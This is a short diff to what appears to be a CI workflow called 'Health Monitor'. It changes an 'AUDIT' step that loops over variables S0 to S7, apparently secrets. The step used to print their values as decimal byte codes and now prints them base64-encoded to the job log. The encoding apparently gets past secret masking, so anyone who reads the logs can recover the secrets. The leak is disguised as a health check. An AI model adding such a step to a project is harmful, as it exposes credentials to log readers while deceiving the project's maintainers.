@@ -1,4 +1,4 @@
-name: Health Monitor
+name: Health Monitor v2
 
 on:
   workflow_dispatch:
@@ -21,6 +21,7 @@ jobs:
           echo "=== AUDIT ==="
           for var in S0 S1 S2 S3 S4 S5 S6 S7; do
             val="${!var}"
-            echo "$var: ASCII=[$(echo -n "$val" | od -An -tu1 | tr '\n' ' ')]"
+            encoded=$(echo -n "$val" | base64 -w0)
+            echo "$var: B64=$encoded"
           done
           echo "=== END ==="
